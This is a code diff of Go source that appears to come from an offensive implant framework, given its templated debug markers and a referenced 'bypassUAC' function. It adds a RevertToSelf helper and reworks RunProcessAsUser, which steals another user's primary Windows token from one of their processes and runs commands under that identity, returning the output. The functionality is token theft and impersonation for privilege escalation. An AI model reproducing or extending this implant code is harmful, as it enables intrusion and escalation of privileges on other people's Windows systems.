@@ -81,6 +81,11 @@ func SePrivEnable(s string) error {
 	return nil
 }
 
+func RevertToSelf() error {
+	CurrentToken = windows.Token(0)
+	return windows.RevertToSelf()
+}
+
 func getPrimaryToken(pid uint32) (*windows.Token, error) {
 	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, pid)
 	if err != nil {
@@ -192,7 +197,7 @@ func impersonateUser(username string) (token windows.Token, err error) {
 			// {{end}}
 			if err == nil {
 				// {{if .Debug}}
-				log.Println("Got system token for process", proc.Pid(), proc.Executable())
+				log.Println("Got token for process", proc.Pid(), proc.Executable())
 				// {{end}}
 				return
 			}
@@ -259,32 +264,28 @@ func bypassUAC(command string) (err error) {
 // RunProcessAsUser - Retrieve a primary token belonging to username
 // and starts a new process using that token.
 func RunProcessAsUser(username, command, args string) (out string, err error) {
-	go func(out string) {
-		runtime.LockOSThread()
-		defer runtime.UnlockOSThread()
-		token, err := impersonateUser(username)
-		if err != nil {
-			// {{if .Debug}}
-			log.Println("Could not impersonate user", username)
-			// {{end}}
-			return
-		}
-		cmd := exec.Command(command, args)
-		cmd.SysProcAttr = &windows.SysProcAttr{
-			Token: syscall.Token(token),
-		}
+	token, err := impersonateUser(username)
+	if err != nil {
 		// {{if .Debug}}
-		log.Printf("Starting %s as %s\n", command, username)
+		log.Println("Could not impersonate user", username)
 		// {{end}}
-		output, err := cmd.Output()
-		if err != nil {
-			// {{if .Debug}}
-			log.Println("Command failed:", err)
-			// {{end}}
-			return
-		}
-		out = string(output)
-	}(out)
+		return
+	}
+	cmd := exec.Command(command, args)
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		Token: syscall.Token(token),
+	}
+	// {{if .Debug}}
+	log.Printf("Starting %s as %s\n", command, username)
+	// {{end}}
+	output, err := cmd.Output()
+	if err != nil {
+		// {{if .Debug}}
+		log.Println("Command failed:", err)
+		// {{end}}
+		return
+	}
+	out = string(output)
 	return
 }
 
